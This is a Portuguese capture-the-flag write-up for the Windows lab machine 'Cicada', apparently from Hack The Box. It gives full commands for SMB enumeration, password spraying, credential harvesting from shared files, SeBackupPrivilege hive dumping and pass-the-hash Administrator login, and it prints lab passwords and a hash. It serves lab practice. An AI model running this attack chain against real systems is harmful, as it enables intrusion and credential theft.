#Difficult : Easy #OS : Windows
***
## Inicial Enumeration
Principalmente em máquinas `Windows` a enumeração costuma ser a parte mais importante de um ataque.
#### Port Scan
Começamos escaneando as portas para mapear nossa superfície de ataque.
```sh
nmap 10.10.11.35 -Pn -sC -sV -A -oN scan_tcp
```
![[Pasted image 20250520091209.png]]

Podemos adiciona-lo ao b=nosso arquivo de hosts.
```sh
echo "10.10.11.35\tCICADA-DC.cicada.htb cicada.htb" >> /etc/hosts
```
#### SSL certificate
```sh
openssl s_client -connect 10.10.11.35:3269 | openssl x509 -noout -text
```
![[Pasted image 20250520091512.png]]
#### SMB shares
Como não temos nenhum usuário ainda, podemos tentar enumerar pelo login anônimo
```sh
netexec smb cicada.htb -u 'guest'  -p '' --shares
```
![[Pasted image 20250520091831.png]]
Temos acesso a um compartilhamento não padrão.
#### Users listing
Podemos tentar listar os usuários do domínio.
```sh
impacket-lookupsid cicada.htb/'guest'@cicada.htb -no-pass | grep TypeUser
```
![[Pasted image 20250520101017.png]]

Não sou muito bom usando o `sed`, então copiei para um arquivo `users.list`, e formatei com o `neovim`. E ficou dessa maneira.
```regex
:%s/.*\\\([a-z]\{}\(\.\|-\)\?[a-z]\{}$\?\).*/\1/g
```
![[Pasted image 20250520101510.png]]
***
## User
Podemos partir para o `SMB` já que temos acesso ao `HR` como o usuário `guest`. Há um arquivo de texto, podemos baixa-lo para examinar melhor.
```sh
smbclient //10.10.11.35/HR -U 'guest'%''

ls
get "Notice from HR.txt"
```
![[Pasted image 20250520101815.png]]

Há uma senha no arquivo, podemos tentar com os usuários que achamos.
```sh
cat "Notice from HR.txt"
```
![[Pasted image 20250520101929.png]]

E temos um usuário que aceita essa senha. Tentei fazer login no sistema, mas ele não é aceito, mas tem acesso ao `SMB`.
```sh
netexec smb cicada.htb -u users.list  -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```
![[Pasted image 20250520102213.png]]

Podemos então fazer uma enumeração de usuário via `SMB`. Parece que temos mais uma senha de usuário.
```sh
netexec smb cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```
![[Pasted image 20250520102541.png]]

Esse usuário também não faz login no sistema, mas te acesso a outro compartilhamento no `SMB`.
```sh
netexec smb cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --users
```
![[Pasted image 20250520103135.png]]

Podemos então acessa-lo, e verificar se há algo de interessante.
```sh
smbclient //10.10.11.35/DEV -U 'david.orelious'%'aRt$Lp#7t*VQ!3'

ls
get Backup_script.ps1
```
![[Pasted image 20250520103642.png]]
Temo um arquivo `Backup_script.ps1`, vamos baixa-lo e analisa-lo.

Eu utilizo o `batcat` por sua melhor aparência.
```sh
batcat Backup_script.ps1
```
![[Pasted image 20250520103842.png]]

Temos um usuário e uma senha, podemos tentar se esse usuário faz login no sistema.
```sh
netexec winrm cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```
![[Pasted image 20250520104052.png]]
E até que em fim um usuário que faz login no sistema.

Podemos fazer login e verificar se já conseguimos a  flag de usuário.
```sh
evil-winrm -i cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
ls ../Desktop
```
![[Pasted image 20250520104259.png]]
***
## Root
Podemos começar vendo os nossos privilégios.
```powershell
whoami /priv
```
![[Pasted image 20250520104623.png]]
A permissão `SeBackupPrivilege` nos da acesso a arquivos protegidos do sistema, pois foi projetada para facilitar o backup do sistema.

Podemos recuperar as hives `hklm/sam` e `hklm/system` para tentar obter alguma hash do sistema.
```powershell
reg save hklm\sam sam.hive
reg save hklm\system system.hive
```
![[Pasted image 20250520105216.png]]

Agora trazemos esses arquivo para nossa máquina.
```powershell
download system.hive
download sam.hive
```
![[Pasted image 20250520105836.png]]

Agora podemos extrair as hashes contidas no `sam.hive`.
```sh
impacket-secretsdump -sam sam.hive -system system.hive Local
```
![[Pasted image 20250520110004.png]]

Agora que conseguimos a hash da senha do `Administrator`, podemos logar e pegar a flag.
```sh
evil-winrm -i cicada.htb -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'
```
![[Pasted image 20250520110220.png]]
***
![[Pasted image 20250520105752.png]]